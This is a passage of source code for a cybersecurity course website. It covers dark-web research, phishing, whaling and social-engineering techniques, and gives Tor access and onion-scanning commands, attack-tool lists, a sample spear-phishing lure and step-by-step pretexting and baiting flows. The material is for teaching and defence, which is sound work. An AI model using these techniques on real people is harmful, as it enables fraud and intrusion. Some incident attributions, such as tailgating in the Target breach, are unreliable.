                  <div class="tool-row"><span>VoidAccess</span><span>Self-hostable OSINT for dark web research</span></div>
                  <div class="tool-row"><span>Darkwatch</span><span>Dark web exposure monitor</span></div>
                </div>

                <h4 class="sub-h">Law Enforcement Operations</h4>
                <ul class="content-list">
                  <li><strong>Operation Bayonet (2017):</strong> Took down AlphaBay and Hansa.</li>
                  <li><strong>Operation RapTor (2025):</strong> 270 arrests across 10 countries.</li>
                  <li><strong>Operation Alice (2026):</strong> Over 373,000 dark web sites shut down, targeting CSAM and CaaS platforms. Led by German authorities with Europol support, involving 23 countries.</li>
                  <li><strong>Hydra Takedown (2022):</strong> German authorities dismantled Russian marketplace Hydra.</li>
                </ul>

                <h4 class="sub-h">Defensive Best Practices for Organizations</h4>
                <ul class="content-list">
                  <li><strong>Monitor for Breaches:</strong> Use dark web monitoring tools to detect leaked credentials and data.</li>
                  <li><strong>Threat Intelligence:</strong> Subscribe to threat intelligence feeds that include dark web sources.</li>
                  <li><strong>Employee Training:</strong> Educate staff on the risks of dark web exposure.</li>
                  <li><strong>Access Control:</strong> Implement MFA and least privilege to limit the impact of compromised credentials.</li>
                  <li><strong>Incident Response:</strong> Develop plans for responding to dark web threats.</li>
                  <li><strong>Legal Compliance:</strong> Ensure monitoring activities comply with privacy laws.</li>
                  <li><strong>OSINT Collection:</strong> Use open-source intelligence techniques to gather information legally.</li>
                </ul>

                <h4 class="sub-h">Ethical and Legal Considerations</h4>
                <ul class="content-list">
                  <li><strong>Authorization:</strong> Only access the dark web for legitimate, authorized purposes.</li>
                  <li><strong>No Illegal Activity:</strong> Do not engage in purchasing illegal goods or services.</li>
                  <li><strong>Privacy:</strong> Respect the privacy of individuals; do not attempt to deanonymize users.</li>
                  <li><strong>Reporting:</strong> Report illegal activity to law enforcement.</li>
                  <li><strong>Laws:</strong> In Pakistan, unauthorized access to dark web criminal activities may violate PECA 2016.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Tor Project</span><span>Official Tor Browser</span></div>
                  <div class="tool-row"><span>Tails OS</span><span>Live OS with Tor</span></div>
                  <div class="tool-row"><span>Ahmia</span><span>Dark web search engine</span></div>
                  <div class="tool-row"><span>I2P</span><span>Alternative anonymity network</span></div>
                  <div class="tool-row"><span>Freenet</span><span>Decentralized anonymity network</span></div>
                  <div class="tool-row"><span>VoidAccess</span><span>OSINT dark web research</span></div>
                  <div class="tool-row"><span>Darkwatch</span><span>Dark web exposure monitor</span></div>
                  <div class="tool-row"><span>Kaduu</span><span>Darknet monitoring</span></div>
                  <div class="tool-row"><span>HackNotice</span><span>Dark web surveillance</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Tor &amp; Dark Web Commands</span></div>
                  <pre><code># Launch Tor Browser (Linux)
torbrowser-launcher

# Access .onion site via Tor SOCKS proxy
curl --socks5-hostname 127.0.0.1:9050 http://example.onion

# Launch Firefox through Proxychains
proxychains firefox

# Scan .onion service through Tor
nmap -sT -Pn -p 80,443 --proxies socks4://127.0.0.1:9050 target.onion

# Capture Tor traffic on loopback
tcpdump -i lo -w tor_traffic.pcap
wireshark tor_traffic.pcap</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>The dark web is a subset of the deep web requiring special software (Tor, I2P) for access.</li>
                  <li>Tor uses onion routing with layered encryption to provide anonymity.</li>
                  <li>Dark web marketplaces facilitate illegal trade: drugs, weapons, stolen data, malware.</li>
                  <li>Cybercrime-as-a-Service is a growing dark web economy.</li>
                  <li>Tor exit nodes can be abused for malicious activities.</li>
                  <li>Security risks include malicious exit nodes, malware, phishing, and deanonymization.</li>
                  <li>Defenders use dark web monitoring tools (Kaduu, HackNotice, RiskProfiler) and law enforcement operations.</li>
                  <li>Law enforcement has conducted major takedowns: Silk Road, AlphaBay, Hansa, Hydra, Operation Alice.</li>
                  <li>Always use the dark web ethically and legally; obtain authorization for investigations.</li>
                  <li>Understanding the dark web is essential for threat intelligence, incident response, and cybercrime investigation.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.torproject.org/" target="_blank" rel="noopener">Tor Project — Official Tor Browser</a>
                  <a href="https://tails.boum.org/" target="_blank" rel="noopener">Tails OS — Live OS with Tor</a>
                  <a href="https://ahmia.fi/" target="_blank" rel="noopener">Ahmia — Dark web search engine</a>
                  <a href="https://geti2p.net/" target="_blank" rel="noopener">I2P — Alternative anonymity network</a>
                  <a href="https://www.europol.europa.eu/" target="_blank" rel="noopener">Europol — Law enforcement reports</a>
                </div>
              </section>
            ` },
                    { id: "4.8", title: "Phishing, Spear Phishing & Whaling", pages: "437-452", read: 20,
            build: "Run a phishing simulation with Gophish and analyze email headers.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Phishing</strong> is a form of social engineering where an attacker impersonates a trustworthy entity to deceive a victim into revealing sensitive information (credentials, credit card numbers, personal data) or performing actions that compromise security (clicking malicious links, opening malicious attachments, transferring funds). Phishing typically occurs via email but can also use SMS (smishing), voice calls (vishing), or social media.</p>
                <p><strong>Spear Phishing</strong> is a targeted phishing attack aimed at a specific individual or small group. The attacker researches the target to craft a highly personalized message that appears legitimate, increasing the likelihood of success. Spear phishing often targets employees with access to sensitive systems or data.</p>
                <p><strong>Whaling</strong> is a specialized form of spear phishing that targets high-profile individuals such as CEOs, CFOs, or other senior executives. Whaling attacks are highly customized and often involve business email compromise (BEC), fraudulent wire transfers, or theft of confidential strategic information.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenarios</h3>
                <ul class="content-list">
                  <li><strong>Phishing:</strong> A user receives an email that appears to be from their bank, stating their account has been compromised and they must click a link to verify their identity. The link leads to a fake website that looks identical to the bank's login page. The user enters credentials, which are captured by the attacker.</li>
                  <li><strong>Spear Phishing:</strong> An attacker researches a company's finance department on LinkedIn. They discover the name of the accounts payable manager. The attacker sends an email pretending to be the CFO, requesting an urgent wire transfer to a new vendor. The email uses the CFO's correct name, title, and a plausible reason. The manager processes the transfer, and the money is lost.</li>
                  <li><strong>Whaling:</strong> The CEO of a multinational corporation receives an email that appears to be from a trusted legal counsel, marked "Privileged and Confidential." The email requests the CEO to review a "merger document" hosted on a file-sharing site. The CEO clicks the link, enters their credentials, and the attacker gains access to the CEO's email account. The attacker then sends emails to the finance team authorizing large payments to attacker-controlled accounts.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Phishing, Spear Phishing &amp; Whaling In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/phishing.png" alt="Phishing attack flow — spoofed email, fake login page, credential harvesting, and account compromise" />
                  <figcaption>Figure 4.8 — Phishing exploits human psychology (authority, urgency, fear) rather than technical vulnerabilities.</figcaption>
                </figure>

                <h4 class="sub-h">The Psychology of Phishing</h4>
                <p>Phishing exploits human psychology rather than technical vulnerabilities. Common psychological triggers include:</p>
                <ul class="content-list">
                  <li><strong>Authority:</strong> Impersonating a boss, bank, or government agency.</li>
                  <li><strong>Urgency:</strong> "Your account will be closed in 24 hours."</li>
                  <li><strong>Fear:</strong> "Suspicious login detected. Confirm your identity."</li>
                  <li><strong>Curiosity:</strong> "You have a package waiting. Click to track."</li>
                  <li><strong>Greed:</strong> "You won a lottery. Claim your prize."</li>
                  <li><strong>Trust:</strong> Using familiar logos, names, and email signatures.</li>
                </ul>

                <h4 class="sub-h">Types of Phishing Attacks</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span><span>Channel</span></div>
                  <div class="tool-row"><span>Email Phishing</span><span>Mass emails to many recipients</span><span>Email</span></div>
                  <div class="tool-row"><span>Spear Phishing</span><span>Targeted emails to specific individuals</span><span>Email</span></div>
                  <div class="tool-row"><span>Whaling</span><span>Targeted at executives</span><span>Email</span></div>
                  <div class="tool-row"><span>Vishing</span><span>Voice phishing via phone calls</span><span>Phone</span></div>
                  <div class="tool-row"><span>Smishing</span><span>SMS phishing</span><span>SMS</span></div>
                  <div class="tool-row"><span>Pharming</span><span>DNS poisoning to redirect to fake sites</span><span>DNS</span></div>
                  <div class="tool-row"><span>Clone Phishing</span><span>Legitimate email cloned and resent with malicious link</span><span>Email</span></div>
                  <div class="tool-row"><span>Angler Phishing</span><span>Fake customer support on social media</span><span>Social Media</span></div>
                  <div class="tool-row"><span>Business Email Compromise (BEC)</span><span>Impersonating executives or vendors</span><span>Email</span></div>
                  <div class="tool-row"><span>Credential Harvesting</span><span>Fake login pages to steal credentials</span><span>Web</span></div>
                  <div class="tool-row"><span>Malware Phishing</span><span>Malicious attachments or links</span><span>Email</span></div>
                  <div class="tool-row"><span>CEO Fraud</span><span>Impersonating CEO to authorize payments</span><span>Email</span></div>
                </div>

                <h4 class="sub-h">Anatomy of a Phishing Email</h4>
                <ul class="content-list">
                  <li><strong>Spoofed Sender Address:</strong> Looks like it comes from a trusted domain.</li>
                  <li><strong>Familiar Logo and Branding:</strong> Copied from legitimate websites.</li>
                  <li><strong>Urgent or Threatening Language:</strong> "Immediate action required."</li>
                  <li><strong>Malicious Link:</strong> Often hidden behind a legitimate-looking URL.</li>
                  <li><strong>Malicious Attachment:</strong> PDF, DOC, XLS with macros or exploits.</li>
                  <li><strong>Grammar and Spelling Errors:</strong> Common in mass phishing, less so in spear phishing.</li>
                  <li><strong>Generic Greeting:</strong> "Dear Customer" instead of your name.</li>
                </ul>

                <h4 class="sub-h">Spear Phishing – Deep Dive</h4>
                <p>Spear phishing requires reconnaissance. The attacker gathers information from:</p>
                <ul class="content-list">
                  <li><strong>Social Media:</strong> LinkedIn, Facebook, Twitter.</li>
                  <li><strong>Company Websites:</strong> About Us, Press Releases, Team Pages.</li>
                  <li><strong>Data Breaches:</strong> Leaked credentials from other sites.</li>
                  <li><strong>Email Patterns:</strong> Using tools to guess email formats (first.last@company.com).</li>
                  <li><strong>Public Records:</strong> SEC filings, court documents.</li>
                </ul>
                <p>The attacker then crafts a message that references real projects, colleagues, or events. For example: <em>"Hi Sarah, I'm working on the Q3 budget with John. He mentioned you have the updated spreadsheet. Could you send it over? Here's the link to the shared folder."</em> The link leads to a credential-harvesting page.</p>

                <h4 class="sub-h">Whaling – Deep Dive</h4>
                <p>Whaling targets the "big fish." These attacks are highly customized and often involve:</p>
                <ul class="content-list">
                  <li><strong>Legal or Regulatory Threats:</strong> "You are being sued. Click here."</li>
                  <li><strong>Executive-Level Topics:</strong> Mergers, acquisitions, board meetings.</li>
                  <li><strong>Trusted Advisors:</strong> Impersonating lawyers, auditors, or consultants.</li>
                  <li><strong>Spoofed Domains:</strong> Using domains that look almost identical to the real one (typosquatting).</li>
                  <li><strong>Timing:</strong> Sending emails when executives are busy or traveling.</li>
                </ul>
                <p>Whaling attacks often aim to: steal confidential data, authorize fraudulent wire transfers, gain access to executive email accounts, or compromise the entire organization.</p>

                <h4 class="sub-h">Business Email Compromise (BEC)</h4>
                <p>BEC is a sophisticated scam targeting businesses that work with foreign suppliers or perform wire transfers. The attacker compromises or spoofs a legitimate business email account to request payments. BEC is a subset of spear phishing and whaling. According to the FBI, BEC has caused over $50 billion in global losses.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Attack Tools &amp; Techniques</span>
                    <ul>
                      <li><strong>Social-Engineer Toolkit (SET):</strong> Phishing campaigns, credential harvesting.</li>
                      <li><strong>Gophish:</strong> Open-source phishing framework.</li>
                      <li><strong>Evilginx2:</strong> Man-in-the-middle phishing for bypassing 2FA.</li>
                      <li><strong>King Phisher:</strong> Phishing campaign toolkit.</li>
                      <li><strong>Phishing Frenzy:</strong> Phishing campaign management.</li>
                      <li><strong>Modlishka:</strong> Reverse proxy for phishing.</li>
                      <li><strong>Spoofed Email:</strong> Using SMTP servers or spoofing tools.</li>
                      <li><strong>Typosquatting:</strong> Registering similar domains.</li>
                      <li><strong>URL Shorteners:</strong> Hiding malicious URLs.</li>
                      <li><strong>Homoglyph Attacks:</strong> Using lookalike characters.</li>
                      <li><strong>Malicious Attachments:</strong> Macros, exploits, PDFs.</li>
                      <li><strong>Credential Harvesting Pages:</strong> Fake login pages.</li>
                      <li><strong>QR Code Phishing (Quishing):</strong> Malicious QR codes.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Real-World Phishing Incidents</span>
                    <ul>
                      <li><strong>Google and Facebook (2013–2015):</strong> $100 million stolen via BEC.</li>
                      <li><strong>Ubiquiti Networks (2015):</strong> $46.7 million lost to BEC.</li>
                      <li><strong>FACC (2016):</strong> $47 million lost; CEO fired.</li>
                      <li><strong>Sony Pictures (2014):</strong> Spear phishing led to massive data breach.</li>
                      <li><strong>DNC (2016):</strong> Spear phishing led to email compromise.</li>
                      <li><strong>Twitter (2020):</strong> Vishing attack led to account takeovers.</li>
                      <li><strong>Colonial Pipeline (2021):</strong> Compromised password from a phishing email led to ransomware.</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Why Phishing Works</h4>
                <ul class="content-list">
                  <li><strong>Human Error:</strong> Employees are not security experts.</li>
                  <li><strong>Volume:</strong> Millions of emails sent; even a 0.1% success rate is profitable.</li>
                  <li><strong>Sophistication:</strong> Spear phishing and whaling are highly convincing.</li>
                  <li><strong>Bypassing Technical Controls:</strong> Phishing bypasses firewalls and antivirus.</li>
                  <li><strong>Credential Theft:</strong> Stolen credentials bypass authentication.</li>
                  <li><strong>Financial Gain:</strong> Direct monetary theft via BEC.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls</h3>

                <h4 class="sub-h">Technical Controls</h4>
                <ul class="content-list">
                  <li><strong>Email Authentication:</strong>
                    <ul>
                      <li><strong>SPF (Sender Policy Framework):</strong> Specifies which IPs can send email for a domain.</li>
                      <li><strong>DKIM (DomainKeys Identified Mail):</strong> Adds a digital signature to verify email integrity.</li>
                      <li><strong>DMARC (Domain-based Message Authentication, Reporting, and Conformance):</strong> Policy for handling failed SPF/DKIM.</li>
                    </ul>
                  </li>
                  <li><strong>Email Filtering:</strong> Use secure email gateways (SEG) to block phishing emails.</li>
                  <li><strong>Link Protection:</strong> Rewrite and scan links at click time.</li>
                  <li><strong>Attachment Sandboxing:</strong> Detonate attachments in a sandbox.</li>
                  <li><strong>DMARC Reporting:</strong> Monitor for spoofing of your domain.</li>
                  <li><strong>MFA:</strong> Multi-factor authentication prevents credential abuse.</li>
                  <li><strong>Password Managers:</strong> Auto-fill only on legitimate domains.</li>
                  <li><strong>DNS Filtering:</strong> Block known phishing domains.</li>
                  <li><strong>Web Proxies:</strong> Block access to malicious sites.</li>
                  <li><strong>Endpoint Protection:</strong> Detect and block malware from phishing.</li>
                </ul>

                <h4 class="sub-h">User Awareness and Training</h4>
                <ul class="content-list">
                  <li><strong>Regular Training:</strong> Conduct phishing awareness training.</li>
                  <li><strong>Simulated Phishing:</strong> Run internal phishing simulations.</li>
                  <li><strong>Report Phishing:</strong> Provide a one-click report button.</li>
                  <li><strong>Recognize Red Flags:</strong> Urgency, generic greetings, suspicious sender addresses, spelling errors, unexpected attachments, links that don't match text, requests for sensitive information.</li>
                  <li><strong>Verify Requests:</strong> Always verify unusual requests via a separate channel.</li>
                  <li><strong>CEO Fraud Training:</strong> Train executives and finance teams specifically.</li>
                </ul>

                <h4 class="sub-h">Organizational Policies</h4>
                <ul class="content-list">
                  <li><strong>Least Privilege:</strong> Limit access to sensitive systems.</li>
                  <li><strong>Separation of Duties:</strong> Require multiple approvals for payments.</li>
                  <li><strong>Wire Transfer Policies:</strong> Verify all payment requests verbally.</li>
                  <li><strong>Incident Response:</strong> Plan for phishing incidents.</li>
                  <li><strong>Reporting Culture:</strong> Encourage employees to report without fear.</li>
                  <li><strong>Third-Party Risk Management:</strong> Assess vendors' security.</li>
                </ul>

                <h4 class="sub-h">Incident Response for Phishing</h4>
                <ul class="content-list">
                  <li><strong>Identification:</strong> User reports suspicious email.</li>
                  <li><strong>Containment:</strong> Block sender, remove email from mailboxes.</li>
                  <li><strong>Eradication:</strong> Reset compromised credentials, revoke sessions.</li>
                  <li><strong>Recovery:</strong> Restore systems, monitor for further activity.</li>
                  <li><strong>Lessons Learned:</strong> Update filters, retrain users.</li>
                </ul>

                <h4 class="sub-h">Legal and Regulatory</h4>
                <ul class="content-list">
                  <li><strong>Report to Authorities:</strong> Report BEC to law enforcement.</li>
                  <li><strong>Compliance:</strong> Ensure phishing controls meet regulations (GDPR, HIPAA, PCI DSS).</li>
                  <li><strong>Insurance:</strong> Consider cyber insurance for phishing losses.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Gophish</span><span>Open-source phishing framework</span></div>
                  <div class="tool-row"><span>Social-Engineer Toolkit (SET)</span><span>Phishing and social engineering</span></div>
                  <div class="tool-row"><span>Evilginx2</span><span>MITM phishing for 2FA bypass</span></div>
                  <div class="tool-row"><span>King Phisher</span><span>Phishing campaign toolkit</span></div>
                  <div class="tool-row"><span>Phishing Frenzy</span><span>Phishing campaign management</span></div>
                  <div class="tool-row"><span>Modlishka</span><span>Reverse proxy for phishing</span></div>
                  <div class="tool-row"><span>DMARC Analyzer</span><span>DMARC reporting</span></div>
                  <div class="tool-row"><span>MXToolbox</span><span>Email header analysis</span></div>
                  <div class="tool-row"><span>PhishTool</span><span>Phishing analysis</span></div>
                  <div class="tool-row"><span>VirusTotal</span><span>Scan URLs and attachments</span></div>
                  <div class="tool-row"><span>URLScan.io</span><span>Scan and analyze URLs</span></div>
                  <div class="tool-row"><span>Have I Been Pwned</span><span>Check for breached credentials</span></div>
                  <div class="tool-row"><span>KnowBe4</span><span>Security awareness training</span></div>
                  <div class="tool-row"><span>Proofpoint</span><span>Email security</span></div>
                  <div class="tool-row"><span>Mimecast</span><span>Email security</span></div>
                  <div class="tool-row"><span>Cofense</span><span>Phishing defense</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Email Security Commands</span></div>
                  <pre><code># Check DMARC record
dig TXT _dmarc.example.com

# Check SPF record
dig TXT example.com

# Check DKIM record
dig TXT selector._domainkey.example.com

# Check headers
curl -I https://example.com

# Check domain registration
whois example.com

# Check MX records
nslookup -type=mx example.com</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Phishing is a social engineering attack that impersonates a trusted entity.</li>
                  <li>Spear phishing is targeted at specific individuals.</li>
                  <li>Whaling targets high-profile executives.</li>
                  <li>BEC is a sophisticated form of spear phishing for financial fraud.</li>
                  <li>Phishing exploits authority, urgency, fear, curiosity, and trust.</li>
                  <li>Attackers use tools like SET, Gophish, Evilginx2.</li>
                  <li>Defenses: email authentication (SPF, DKIM, DMARC), filtering, MFA, user training, simulations.</li>
                  <li>Incident response: identify, contain, eradicate, recover, learn.</li>
                  <li>Report phishing and BEC to authorities.</li>
                  <li>Understanding phishing is essential for protecting people and organizations.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://getgophish.com/" target="_blank" rel="noopener">Gophish — Open-source phishing framework</a>
                  <a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener">Social-Engineer Toolkit (SET)</a>
                  <a href="https://github.com/kgretzky/evilginx2" target="_blank" rel="noopener">Evilginx2 — MITM phishing</a>
                  <a href="https://www.ic3.gov/" target="_blank" rel="noopener">FBI IC3 — Report BEC</a>
                  <a href="https://apwg.org/" target="_blank" rel="noopener">APWG — Anti-Phishing Working Group</a>
                </div>
              </section>
            ` },
                    { id: "4.9", title: "Social Engineering (Baiting, Tailgating & Pretexting)", pages: "453-468", read: 20,
            build: "Design and run a USB drop test and tailgating exercise in a lab.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Social Engineering</strong> is the art of manipulating people into divulging confidential information or performing actions that compromise security. It exploits human psychology—trust, fear, curiosity, helpfulness, and authority—rather than technical vulnerabilities. Social engineering attacks are often the first step in a larger campaign, bypassing technical controls by targeting the human element.</p>
                <p><strong>Baiting</strong> is a social engineering technique where an attacker leaves a physical or digital item (e.g., a USB drive, a download link) that appeals to the victim's curiosity or greed. When the victim takes the bait, they inadvertently install malware or compromise their system.</p>
                <p><strong>Tailgating</strong> (also called piggybacking) is a physical social engineering technique where an unauthorized person follows an authorized person into a restricted area without proper authentication. It exploits politeness and the assumption that someone with valid access has already been verified.</p>
                <p><strong>Pretexting</strong> is a social engineering technique where an attacker creates a fabricated scenario (a pretext) to engage a victim in conversation and extract information or persuade them to perform an action. The attacker often impersonates a trusted figure (e.g., IT support, auditor, police officer) to establish credibility.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenarios</h3>
                <ul class="content-list">
                  <li><strong>Baiting:</strong> An attacker drops several USB drives labeled "Payroll 2025" in a company parking lot. An employee finds one, plugs it into their work computer out of curiosity, and the USB drive automatically executes malware that installs a backdoor. The attacker now has access to the corporate network.</li>
                  <li><strong>Tailgating:</strong> An attacker carrying boxes of pizza approaches a secure door at a company. An employee badges in, and the attacker says, "Could you hold the door? My hands are full." The employee, being polite, holds the door, and the attacker enters the restricted area without authentication.</li>
                  <li><strong>Pretexting:</strong> An attacker calls an employee claiming to be from the IT department. "We're seeing unusual activity on your account. I need to verify your identity. Can you confirm your username and password?" The employee, trusting the IT authority, provides the credentials. The attacker now has access.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Social Engineering In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/social-engineering.png" alt="Social engineering techniques — baiting with USB, tailgating through secure door, and pretexting via phone call" />
                  <figcaption>Figure 4.9 — Social engineering exploits human psychology: curiosity (baiting), politeness (tailgating), and trust (pretexting).</figcaption>
                </figure>

                <h4 class="sub-h">The Psychology of Social Engineering</h4>
                <p>Social engineering exploits cognitive biases and social norms:</p>
                <ul class="content-list">
                  <li><strong>Authority:</strong> People tend to comply with requests from authority figures.</li>
                  <li><strong>Reciprocity:</strong> People feel obligated to return a favor.</li>
                  <li><strong>Social Proof:</strong> People follow the actions of others.</li>
                  <li><strong>Liking:</strong> People are more easily persuaded by someone they like.</li>
                  <li><strong>Scarcity:</strong> People act quickly when something is limited.</li>
                  <li><strong>Urgency:</strong> People rush when there is a deadline.</li>
                  <li><strong>Fear:</strong> People comply to avoid negative consequences.</li>
                  <li><strong>Curiosity:</strong> People want to know what is inside a package or file.</li>
                  <li><strong>Helpfulness:</strong> People want to help others, especially when asked politely.</li>
                </ul>

                <h4 class="sub-h">Baiting – Deep Dive</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> The attacker identifies a target (individual or organization).</div>
                  <div class="step-item"><span class="step-num">2</span> The attacker leaves bait where the target will find it (physical USB, malicious download link, fake software update).</div>
                  <div class="step-item"><span class="step-num">3</span> The target takes the bait (plugs in USB, clicks link, downloads file).</div>
                  <div class="step-item"><span class="step-num">4</span> The bait executes malicious code or leads to credential theft.</div>
                  <div class="step-item"><span class="step-num">5</span> The attacker gains access or escalates privileges.</div>
                </div>
                <ul class="content-list">
                  <li><strong>Physical Baiting:</strong> USB drives labeled with enticing names ("Confidential," "Salary Info," "Q4 Bonus"), CDs/DVDs with fake software, hardware implants (keyloggers, network taps).</li>
                  <li><strong>Digital Baiting:</strong> Malicious links in emails or social media, fake software downloads (cracked software, keygens), fake login pages, QR codes leading to malicious sites (quishing).</li>
                </ul>
                <p><strong>Why It Works:</strong> Curiosity ("What's on this USB?"), Greed ("Free software!"), Urgency ("You must update now."), Trust ("It's from the IT department.")</p>
                <p><strong>Notable Incidents:</strong> 2006 U.S. Department of Defense (USB drives infected with malware found in parking lots), 2010 Stuxnet (USB drives used to spread malware to air-gapped nuclear facilities), 2018 Israeli Defense Forces (USB drives used in a cyberattack).</p>

                <h4 class="sub-h">Tailgating – Deep Dive</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> The attacker approaches a secure entrance.</div>
                  <div class="step-item"><span class="step-num">2</span> The attacker waits for an authorized person to open the door.</div>
                  <div class="step-item"><span class="step-num">3</span> The attacker follows closely behind or asks the person to hold the door.</div>
                  <div class="step-item"><span class="step-num">4</span> The attacker gains physical access without authentication.</div>
                </div>
                <ul class="content-list">
                  <li><strong>Common Scenarios:</strong> Carrying boxes, coffee, or equipment to appear in need of help; dressing as a delivery person, maintenance worker, or cleaner; pretending to have lost a badge; following a group of employees during a busy time; waiting at smoking areas or side entrances.</li>
                  <li><strong>Why It Works:</strong> Politeness (people don't want to be rude), assumption of legitimacy ("If they're here, they must belong"), distraction (people are busy), lack of challenge culture (employees are not trained to challenge strangers).</li>
                  <li><strong>Notable Incidents:</strong> 2013 Target Breach (attackers gained initial access via a third-party HVAC vendor who was tailgated), 2014 Sony Pictures (attackers used social engineering and physical access), 2017 CIA Vault 7 (documents revealed tailgating techniques used in operations).</li>
                </ul>

                <h4 class="sub-h">Pretexting – Deep Dive</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> The attacker gathers information about the target (via social media, public records, phishing).</div>
                  <div class="step-item"><span class="step-num">2</span> The attacker creates a believable pretext (a story or scenario).</div>
                  <div class="step-item"><span class="step-num">3</span> The attacker engages the victim via phone, email, or in person.</div>
                  <div class="step-item"><span class="step-num">4</span> The attacker builds rapport and trust.</div>
                  <div class="step-item"><span class="step-num">5</span> The attacker requests information or action.</div>
                  <div class="step-item"><span class="step-num">6</span> The victim complies.</div>
                </div>
                <ul class="content-list">
                  <li><strong>Common Pretexts:</strong> IT Support ("We're updating the system. I need your password."), Auditor ("I'm here for the annual security audit."), Police Officer ("There's been a security incident. I need to verify your identity."), Delivery Person ("I have a package for the CEO."), Vendor ("I'm from the software company. I need to check your server."), New Employee ("I'm new here. Can you help me log in?"), Executive ("This is the CFO. I need you to process this payment immediately.")</li>
                  <li><strong>Why It Works:</strong> Authority (people obey perceived authority), Trust (people trust familiar roles), Urgency (people act quickly under pressure), Fear (people comply to avoid trouble), Helpfulness (people want to be helpful).</li>
                  <li><strong>Notable Incidents:</strong> 2011 RSA SecurID Breach (pretexting via phishing led to compromise), 2015 Ubiquiti Networks (BEC pretexting led to $46.7 million loss), 2016 DNC Hack (spear phishing and pretexting), 2020 Twitter Hack (vishing and pretexting led to account takeovers).</li>
                </ul>

                <h4 class="sub-h">Other Social Engineering Techniques</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Technique</span><span>Description</span></div>
                  <div class="tool-row"><span>Quid Pro Quo</span><span>Offering a service in exchange for information</span></div>
                  <div class="tool-row"><span>Diversion Theft</span><span>Creating a distraction to steal something</span></div>
                  <div class="tool-row"><span>Honey Trap</span><span>Using romantic or sexual attraction to manipulate</span></div>
                  <div class="tool-row"><span>Watering Hole</span><span>Compromising a website frequented by the target</span></div>
                  <div class="tool-row"><span>Shoulder Surfing</span><span>Observing someone entering a password or PIN</span></div>
                  <div class="tool-row"><span>Dumpster Diving</span><span>Searching trash for sensitive information</span></div>
                  <div class="tool-row"><span>Phishing</span><span>Email-based social engineering</span></div>
                  <div class="tool-row"><span>Vishing</span><span>Voice phishing via phone</span></div>
                  <div class="tool-row"><span>Smishing</span><span>SMS phishing</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Attack Tools &amp; Techniques</span>
                    <ul>
                      <li><strong>USB Rubber Ducky:</strong> Programmable USB that executes keystrokes.</li>
                      <li><strong>BadUSB:</strong> Malicious firmware on USB devices.</li>
                      <li><strong>Social-Engineer Toolkit (SET):</strong> Framework for social engineering attacks.</li>
                      <li><strong>Gophish:</strong> Phishing campaign management.</li>
                      <li><strong>Evilginx2:</strong> MITM phishing for 2FA bypass.</li>
                      <li><strong>Caller ID Spoofing:</strong> Faking phone numbers.</li>
                      <li><strong>Pretexting Scripts:</strong> Pre-written scenarios for phone calls.</li>
                      <li><strong>OSINT Tools:</strong> Gathering information for pretexting (Maltego, theHarvester, Sherlock).</li>
                      <li><strong>Physical Implants:</strong> Keyloggers, network taps, rogue devices.</li>
                      <li><strong>Lock Picking:</strong> Bypassing physical locks.</li>
                      <li><strong>RFID Cloning:</strong> Copying access badges.</li>
                      <li><strong>Tailgating:</strong> Following authorized personnel.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Real-World Social Engineering Incidents</span>
                    <ul>
                      <li><strong>Kevin Mitnick:</strong> Famous hacker who used social engineering to gain access to corporate systems.</li>
                      <li><strong>Frank Abagnale:</strong> Con artist who impersonated pilots, doctors, and lawyers.</li>
                      <li><strong>2011 RSA Breach:</strong> Pretexting and phishing led to SecurID compromise.</li>
                      <li><strong>2013 Target Breach:</strong> Tailgating and vendor credentials led to 40 million card numbers stolen.</li>
                      <li><strong>2015 Ubiquiti Networks:</strong> BEC pretexting led to $46.7 million loss.</li>
                      <li><strong>2016 DNC Hack:</strong> Spear phishing and pretexting.</li>
                      <li><strong>2020 Twitter Hack:</strong> Vishing and pretexting led to high-profile account takeovers.</li>
                      <li><strong>2021 Colonial Pipeline:</strong> Compromised password from a phishing email led to ransomware.</li>
                    </ul>
                  </div>
